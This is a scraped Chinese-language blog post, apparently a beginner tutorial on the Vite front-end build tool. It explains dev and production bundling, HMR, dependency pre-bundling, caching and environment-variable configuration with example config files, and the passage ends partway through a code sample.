itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浅析Vite前端构建工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3942228504379243/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    saberxyL
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:22:29.000Z" title="Tue Feb 03 2026 04:22:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">浅析Vite前端构建工具</h2>
<p>本篇文章意在帮助初学者了解Vite的工作流程以及学习常见配置</p>
<h3 data-id="heading-1">Vite简介</h3>
<blockquote>
<p><strong>Vite</strong>（法语意为快速）是vue官方发布的新型前端构建工具，用于快速构建前端项目，显著提升开发体验，其特点就是快！</p>
</blockquote>
<p><code>！！！注意：</code><strong>Vite</strong>是构建工具，虽然具有打包功能，但其打包能力来自其他打包工具，如在开发环境下使用<code>esbuild</code>进行打包，而在生产环境下则使用<code>rollup</code>进行打包，<strong>vite</strong>更注重的是前端的自动化流程。开发好的代码，通过自动化流程转换成生产环境代码。</p>
<h4 data-id="heading-2">为什么选择Vite</h4>
<blockquote>
<p>随着前端的发展，我们开始需要构建越来越大型的应用，需要处理的JavaScript代码呈指数级增长。</p>
<p>而传统的打包工具在构建这种大型项目时就会遇到性能问题，如项目启动速度缓慢，热更新（HMR）迟钝，这极大的影响了开发者的开发体验。</p>
<p>以下是常见的打包构建工具：</p>
<ul>
<li>Webpack</li>
<li>rollup</li>
<li>parcel</li>
<li>gulp</li>
</ul>
<p>这些工具在大型项目中都存在缓慢的服务启动和缓慢的热更新问题，而<strong>Vite</strong>恰好对这两个问题提出了解决方案，所以<strong>Vite</strong>在启动项目时的速度相当之快</p>
<p>所以<strong>Vite</strong>的优势就是：</p>
<ul>
<li>开发启动速度快</li>
<li>热更新（HMR）响应迅速</li>
<li>构建性能高效</li>
<li>配置简单且扩展性强</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-3">Vite的打包构建策略</h3>
<blockquote>
<p>这里我们将简单梳理Vite的在开发阶段、热更新阶段，以及在生产阶段时的构建思路。</p>
</blockquote>
<p>先来看vite官方文档中的两张图</p>
<p>前一张图是传统构建工具的打包构建流程图，它们在启动项目时采用的策略是对项目代码和其依赖进行全量打包后再启动服务。</p>
<p>后一张图是<strong>Vite</strong>的打包构建流程，<strong>Vite</strong>采用的策略是先启动服务，之后按需加载所需要的代码文件。</p>
<ul>
<li>图一</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dab2bfe05cec43eb90f789e2be4681f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=vD35bqxy%2FDa2nla6q8aaD9ivUNE%3D" alt="" loading="lazy"/></p>
<ul>
<li>图二</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67faac25d708467a944329581bd3279c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=kmqo696WcFNxjtj9n1hM6n1Wupo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">传统打包构建工具的问题</h4>
<p>从不同的打包策略中我们可以分析出，造成传统打包工具服务启动缓慢，热更新响应速度慢的原因：</p>
<blockquote>
<ul>
<li>必须打包后才能启动服务。当项目越大，代码文件越多时，打包需要处理的模块数量就越多，启动等待时间就会成先行指数级增长，大型项目启动耗时几分钟很常见。</li>
<li>依赖处理无缓存。一些第三方依赖（如Vue、React、Axios、Lodash）通常体积大且变动少，每次启动/修改都会重复处理，就会造成资源浪费，进一步延长了启动时间。</li>
<li>模块依赖链重新构建。当某个文件被修改时，工具不仅要重新编译这个文件，还要重新处理所有依赖它的上游模块，导致热更新速度慢。</li>
</ul>
</blockquote>
<h4 data-id="heading-5">开发环境打包</h4>
<p>一开始<strong>Vite</strong>将应用中的模块区分为了两类，<strong>依赖</strong>和<strong>源码</strong>。</p>
<blockquote>
<ul>
<li>
<p>依赖：大多是在开发时不会变动的第三方库（如loadash、elementPlus等）。</p>
</li>
<li>
<p>源码：通常是开发者编写的代码，时常会被编辑，需要转换的文件（如Vue、CSS、JSX等）</p>
</li>
</ul>
</blockquote>
<p>开发环境下，<strong>Vite</strong>会使用<strong>esbuild</strong>对依赖进行打包（即<strong>依赖预构建</strong>）。</p>
<p>对于源码<strong>Vite</strong>通常将其打包工作交给了浏览器而不是打包，只在浏览器请求源码时进行转换并按需提供源码。</p>
<p><strong>esbuild</strong>是go语言编写的打包工具，比使用JavaScript编写的打包工具速度快10-100倍。</p>
<h4 data-id="heading-6">热更新（HMR）</h4>
<blockquote>
<p>前面我们知道了，如果仅仅修改一个文件就要重新构建整个模块是及其低效的，而且体积越大时，更新的速度也会越慢。</p>
</blockquote>
<p>所以<strong>Vite</strong>热更新的策略是<strong>精准、高效地更新变化的模块，避免全量页面刷新</strong>，同时尽可能保留应用状态。</p>
<p>整个热更新阶段，<strong>vite</strong>经历了以下几个步骤</p>
<ol>
<li>首先开发服务器会实时监控文件修改。</li>
<li>监测到文件修改时，会通过模块依赖图，找到受变更影响的模块链。</li>
<li>针对变化模块（如 JS、CSS、Vue 等）快速生成更新代码。</li>
<li>然后通过 WebSocket 将更新指令发送给客户端。</li>
<li>客户端在接收指令后，动态替换旧模块、执行新代码，仅更新受影响部分，保留应用状态，避免全量刷新。</li>
</ol>
<h4 data-id="heading-7">生产环境打包</h4>
<p>Vite 在生产环境的打包构建思路与开发环境截然不同，核心目标是<strong>生成优化后的、可直接部署的静态资源</strong>，兼顾性能（加载速度、运行效率）和浏览器兼容性。</p>
<ol>
<li><strong>基于 Rollup 进行打包构建</strong></li>
</ol>
<p>首先<strong>VIte</strong>使用功能更成熟的Rollup 作为底层打包工具（开发阶段用的是esbuild，因为它对代码压缩、Tree-shaking 等优化更高效）。</p>
<ol start="2">
<li><strong>配置Vite后可以进行的优化（生产环境下）</strong>
<ul>
<li>自动将代码拆分为多个 chunk：
<ul>
<li>入口 chunk：应用的主入口代码。</li>
<li>公共 chunk：提取多个模块共享的代码（如工具函数、重复依赖），避免重复加载。</li>
<li>异步 chunk：对 <code>import()</code> 动态导入的模块单独打包，实现 “按需加载”（如路由懒加载），减少初始加载体积。</li>
</ul>
</li>
<li>Tree-Shaking 消除冗余代码:
<ul>
<li>利用 Rollup 的 Tree-Shaking 能力，删除未被引用的代码（如未使用的函数、变量），减小最终 bundle 体积。</li>
<li>对第三方库，优先使用其 ESM 版本（通过 <code>package.json</code> 的 <code>module</code> 或 <code>exports</code> 字段），确保 Tree-Shaking 有效。</li>
</ul>
</li>
<li>对 JS、CSS 代码进行压缩：
<ul>
<li>JS：使用 <code>terser</code> 压缩（默认开启），移除空格、缩短变量名、合并语句等。</li>
<li>CSS：使用 <code>cssnano</code> 压缩，移除冗余样式、合并规则等。</li>
</ul>
</li>
<li>支持通过配置来开启代码混淆，提高逆向工程难度。</li>
<li>优化图片、字体等静态资源体积：
<ul>
<li>小资源（如小于 4KB 的图片）自动转为 base64 编码嵌入代码，减少网络请求</li>
<li>大资源生成带哈希值的文件名（如 <code>logo.8f3b7a.png</code>），配合长期缓存策略（<code>Cache-Control</code>），提升二次加载速度。</li>
</ul>
</li>
<li>兼容性处理:
<ul>
<li>通过 <code>@vitejs/plugin-legacy</code> 插件：生成兼容 ES5 的代码（使用 <code>babel</code> 转换语法），并且自动注入 polyfill（如 <code>core-js</code>），处理新 API 兼容问题。</li>
<li>通过 <code>postcss</code> + <code>autoprefixer</code>自动添加CSS前缀，从而适配不同浏览器内核。</li>
</ul>
</li>
</ul>
</li>
<li><strong>构建流程</strong>
<ul>
<li><strong>解析配置</strong>：读取 <code>vite.config.js</code> 中的生产环境配置（如 <code>build</code> 选项）。</li>
<li><strong>依赖预构建复用</strong>：复用开发环境预构建的第三方依赖（或重新构建，确保一致性），避免重复处理。</li>
<li><strong>模块打包</strong>：通过 Rollup 递归解析项目依赖，应用代码分割、Tree-Shaking 等优化，生成多个 chunk。</li>
<li><strong>资源处理</strong>：处理静态资源、压缩代码、生成哈希文件名。</li>
<li><strong>生成产物</strong>：输出最终文件到 <code>dist</code> 目录，包含 HTML、JS、CSS、静态资源等，并自动处理资源间的引用路径（如 HTML 中引入带哈希的 JS/CSS）。</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-8">依赖预构建</h3>
<p>这里我们将了解在生产阶段时，<strong>Vite</strong>如何对依赖进行预构建，以及做了哪些优化。</p>
<p><strong>目的</strong>：</p>
<blockquote>
<ul>
<li>更好的兼容性</li>
<li>更好的性能</li>
</ul>
</blockquote>
<p>这里我们先简单创建一个Vite项目，方便后续讲解。</p>
<p><strong>创建一个示例项目</strong>：</p>
<p>首先,打开或者新建一个空的项目文件夹，在其根目录下打开控制台并执行以下命令初始化<code>package.json</code>文件。</p>
<pre><code class="hljs language-csharp" lang="csharp">npm <span class="hljs-keyword">init</span> -y <span class="hljs-comment">// -y:自动在package.json中填入默认配置，无需手动配置</span>
或
pnpm <span class="hljs-keyword">init</span> <span class="hljs-comment">// pnpm无需 -y,默认进行配置</span>
</code></pre>
<p>然后安装Vite</p>
<pre><code class="hljs language-csharp" lang="csharp">npm i vite -D <span class="hljs-comment">// -D, --save-dev的缩写，作用是将依赖包安装为 “开发环境依赖”</span>
或
pnpm <span class="hljs-keyword">add</span> vite -D
</code></pre>
<p>然后初始化项目结构：</p>
<pre><code class="hljs language-go" lang="go">video-test
├─ node_modules
├─ main.js
├─ index.html  <span class="hljs-comment">// 项目打包入口文件</span>
├─ <span class="hljs-keyword">package</span>-lock.json <span class="hljs-comment">// 使用pnpm命令时是pnpm-lock.yaml</span>
├─ <span class="hljs-keyword">package</span>.json
</code></pre>
<p>在index.html中引入main.js</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- index.html --&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- type="moudle"作用是告诉浏览器按照 ESM 规则解析和执行代码 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"moudle"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-9"><strong>依赖打包</strong></h4>
<p><strong>Vite</strong>在启动开发服务器时，会对依赖进行预构建：<strong>Vite</strong>会使用<strong>esbuild</strong>对第三方依赖对其进行打包。打包的过程中就会执行<strong>兼容性处理</strong>和<strong>路径解析</strong>、<strong>文件缓存优化</strong>、<strong>浏览器缓存优化</strong>，然后对<strong>源码</strong>进行一系列处理后交给浏览器打包。</p>
<h4 data-id="heading-10"><strong>兼容性处理</strong></h4>
<p>在开发时，很多第三方库或项目代码可能使用 CommonJS（CJS）、UMD 等非 ESM 模块化语法，而浏览器原生 ESM 只能识别 <code>import</code>/<code>export</code> 语法，无法直接运行 CJS 模块（如 <code>require</code>、<code>module.exports</code>）。</p>
<p>例如<code>lodash</code>库，执行以下命令引入<code>lodash</code>库:</p>
<pre><code class="hljs language-csharp" lang="csharp">npm i lodash 
或
pnpm <span class="hljs-keyword">add</span> lodash
</code></pre>
<p>打开<code>node_modules\lodash\_apply.js</code>，我们可以看到<code>lodash</code>使用了非<strong>ESM</strong>标准的导入导出方式</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15e10212d8e5459b92f22ced0d6cc2bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=f1LyFfis4M9hjg2L47BBxq7xGCc%3D" loading="lazy"/>
<p><strong>Vite</strong>的开发服务器将所有代码视为原生 ES 模块，所以必须要处理兼容性问题。<strong>Vite</strong>采用策略是当浏览器对某个模块发送请求时使用<strong>esbuild</strong>对其进行转换操作，不仅解决了兼容性问题，还避免了全量打包带来的性能消耗。</p>
<h4 data-id="heading-11">路径解析</h4>
<p><strong>1.无法识别的路径</strong></p>
<p>浏览器并不知道要到<code>node_modules</code>目录下去找对应依赖，即对于非相对路径和绝对路径的导入是无法识别的。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span> <span class="hljs-comment">// 没有使用绝对路径和相对路径，浏览器不知道怎么获取</span>
</code></pre>
<p>为了处理无法识别例如<code>'axios'</code>这种裸模块名，<strong>Vite</strong>会在依赖构建阶段对其进行路径映射为具体的文件路径：</p>
<blockquote>
<ul>
<li>分析依赖的入口文件（通过 <code>package.json</code> 的 <code>main</code> 或 <code>module</code> 字段），确定该模块名实际对应的文件（如 <code>node_modules/axios/dist/axios.esm.js</code>）。</li>
<li>预构建后的依赖会放到<code>.node_modules/.vite/.deps</code>目录下，并生成一个映射表（<code>deps_map</code>），记录裸模块名与实际路径的对应关系。</li>
</ul>
</blockquote>
<p>然后在浏览器解析到<code>import axios from 'axios'</code>而对<strong>Vite开发服务器</strong>发送请求时，<strong>Vite</strong>在拦截到该请求后，根据依赖构建阶段时创建的映射表将其<strong>路径重写</strong> 为具体的预构建文件路径（如 <code>/node_modules/.vite/deps/axios.js</code>），并返回给浏览器，使得浏览器能正确加载模块。</p>
<p>2.<strong>相对路径和别名路径的处理</strong></p>
<p>对于项目内的相对路径（如 <code>import './utils'</code>），Vite 会自动补全文件后缀（<code>.js</code>、<code>.ts</code> 等）和目录索引文件（<code>index.js</code>），避免浏览器因路径不全导致的 404 错误。同时支持通过 <code>vite.config.js</code> 配置 <code>resolve.alias</code> 自定义路径别名（如 <code>@/utils</code>），进一步简化路径编写。</p>
<h4 data-id="heading-12"><strong>文件缓存</strong></h4>
<p>打包后的代码会放到<code>node_modules/.vite</code>文件下面进行<strong>文件缓存</strong>（同时转换为<strong>ESM</strong>标准），并且将嵌套引用的依赖打包为一个文件，以减少浏览器的http请求（例如<code>lodash库作为第三方依赖会被打包成一个js文件</code>），并在之后的开发服务启动时使用这个缓存直到第三方依赖发生修改才重新进行依赖预构建，减少了依赖打包构建次数。</p>
<ul>
<li><code>node_modules/.vite</code> 目录下的缓存文件会包含<strong>版本哈希标识</strong>（如 <code>react.js?v=123abc</code>），哈希值由依赖内容、版本号及 Vite 配置共同生成，确保依赖或配置变更时，缓存会自动失效并触发重新构建。</li>
<li>缓存目录中还会生成 <code>_metadata.json</code> 文件，记录依赖的构建信息（如入口、依赖链），用于 Vite 启动时快速校验缓存是否有效，减少重复扫描开销。</li>
</ul>
<h4 data-id="heading-13"><strong>浏览器缓存</strong></h4>
<p>同时对于已预构建的依赖请求使用 HTTP 头 <code>max-age=31536000, immutable</code> 进行强缓存，以提高开发期间页面重新加载的性能。同样如果依赖源没有发生改变，这些请求将永远不会再次访问开发服务器，而是直接从级存中读取。而对于源码。</p>
<h4 data-id="heading-14"><strong>源码交给浏览器打包</strong></h4>
<ul>
<li>源码（如业务 JS、TS、Vue 组件等）会被 Vite 实时转换为 ESM 格式（例如将 TS 转 JS、处理 CSS 模块），但<strong>不进行合并打包</strong>，而是保留模块间的引用关系（如 <code>import './component'</code>）。</li>
<li>浏览器加载这些 ESM 模块时，会根据 <code>import</code> 语句主动发起子请求，由 Vite 服务器实时返回对应模块的转换结果，本质是<strong>将 “打包合并” 的工作分散到浏览器的原生模块加载过程中</strong>，减少开发服务器的计算压力，实现 “按需编译”。</li>
</ul>
<h3 data-id="heading-15">配置智能提示</h3>
<p>在添加配置项的时候会给出配置项联想，如图所示在配置对象中敲<code>ser</code>就会出现提示框</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1c724494319492c98dd4bbd77682439~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=ws6HkkSThoXFKMA%2FkUoNgcUoOzA%3D" loading="lazy"/>
<p>官方给了三种智能提示的配置方法，推荐使用下面这种方式</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
	<span class="hljs-comment">//...</span>
})
</code></pre>
<h3 data-id="heading-16">准备配置文件</h3>
<p>准备好以下几个文件</p>
<p><code>vite.prod.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 生产环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({  
  <span class="hljs-attr">build</span>: {
      
  }
})
</code></pre>
<p><code>vite.dev.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">//开发环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({ 
  <span class="hljs-attr">server</span>: { 
  
  }
})
</code></pre>
<p><code>vite.base.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 公共配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({                        
})
</code></pre>
<p>将上诉的配置文件汇总，采用策略模式，在不同环境下引入不同的配置</p>
<p><code>vite.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>
<span class="hljs-keyword">import</span> viteBaseConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.base.config.js'</span> <span class="hljs-comment">//基础配置</span>
<span class="hljs-keyword">import</span> viteDevConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.dev.config.js'</span> <span class="hljs-comment">// 开发环境配置</span>
<span class="hljs-keyword">import</span> viteProdConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.prod.config.js'</span> <span class="hljs-comment">// 生产环境配置</span>

<span class="hljs-comment">// 策略模式</span>
<span class="hljs-keyword">const</span> envResolver = {
  <span class="hljs-comment">// 这里的展开运算符和Object.assign()都是浅拷贝的方法</span>
  <span class="hljs-string">"build"</span>: <span class="hljs-function">() =&gt;</span> ({...viteBaseConfig, ...viteProdConfig}),
  <span class="hljs-string">"serve"</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({},viteBaseConfig, viteDevConfig)
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>( <span class="hljs-function">(<span class="hljs-params">{command}</span>) =&gt;</span> {
  <span class="hljs-comment">// command: 根据命令(pnpm dev | pnpm serve) 返回 ("build" | "serve")</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"command:"</span>, command);

  <span class="hljs-keyword">return</span> envResolver[command]()
})
</code></pre>
<h3 data-id="heading-17"><strong>环境变量（env）</strong></h3>
<p><strong>环境变量</strong>：是在操作系统或应用程序运行时存在的一组动态键值对（key-value），用于存储影响程序行为的配置信息。它们独立于程序代码本身，通过外部传递给程序，使程序能在不同环境（如开发、测试、生产）中灵活调整行为，而无需修改代码。</p>
<h4 data-id="heading-18">loadEnv</h4>
<p>是Vite的一个专门加载和处理环境变量的API，类似于dotenv库
dotenv 是一个非常实用的第三方库，主要用于从 .env 文件中加载环境变量到 process.env</p>
<p><strong>loadEnv的三个参数</strong></p>
<ul>
<li>mode: 当前运行模式（如 development、production、test，注意拼写）</li>
<li>envDir: .env 相关文件所在目录（默认项目根目录）</li>
<li>prefix: 环境变量的过滤前缀（用于后续注入import.meta.env，默认VITE_）</li>
</ul>
<p><strong>loadEnv执行过程</strong></p>
<ol>
<li>
<p>根据mode加载指定目录下的环境文件，加载顺序（优先级从低到高）：</p>
<ul>
<li>.env                （所有环境共享的基础配置）</li>
<li>.env.local       （本地私有基础配置，覆盖.env，通常不上传仓库）</li>
<li>.env.${mode}  （当前模式的专属配置，如.env.development）</li>
<li>.env.${mode}.local  （当前模式的本地私有配置，覆盖.env.${mode}，不上传仓库）
同时，系统环境变量的优先级最高，会覆盖所有文件中的同名变量</li>
</ul>
</li>
<li>
<p>变量合并规则：后加载的配置会覆盖前序配置中的同名变量
例如mode="development"时，最终合并结果为：</p>
<blockquote>
<p>{
...基础.env,
...本地.env.local,
...开发环境.env.development,
...开发本地.env.development.local,
...系统环境变量
} // 展开运算符</p>
</blockquote>
</li>
<li>
<p>函数返回值为合并后的所有环境变量（包含所有前缀/非前缀变量）</p>
</li>
<li>
<p><strong>loadEnv</strong>的返回值包含所有符合其自身<code>prefix</code>参数的环境变量（Node环境可见，用于配置逻辑）
但最终注入到<code>import.meta.env</code>的变量，由<strong>Vite</strong>的全局配置<code>envPrefix</code>（默认VITE_）决定：</p>
<ul>
<li>只有符合<code>envPrefix</code>前缀的变量，才会被注入到前端代码的import.meta.env中（浏览器环境可见）；</li>
<li>非<code>envPrefix</code>前缀的变量（即使被loadEnv返回），也不会暴露到前端，仅在Node环境的配置中可用（如后端密钥等敏感信息）。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-19">手动加载机制</h4>
<p>在配置 Vite 本身时（如自定义开发服务器端口、生产环境打包路径等），需要依赖环境变量动态调整配置。此时通过 <code>loadEnv</code> 手动加载 <code>.env*</code> 文件中的变量，可在配置逻辑中直接使用。</p>
<p>通常为了在大型项目中提高项目的可维护性，我们可以在不同环境下都维护一个环境变量文件，即创建以下三个文件：</p>
<ul>
<li><code>.env</code>:公共的环境变量文件</li>
<li><code>.env.development</code>:开发环境下的环境变量文件</li>
<li><code>.env.production</code>:生产环境下的环境变量文件</li>
</ul>
<p>将这些配置文件放到<code>项目根目录\config\env\</code></p>
<p>然后可以在vite.config.js中使用loadEnv方法统一获取，传递给不同环境下的配置文件</p>
<p>在<code>vite.config.js</code>中修改:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig, loadEnv } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> viteDevConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.dev.config.js'</span>
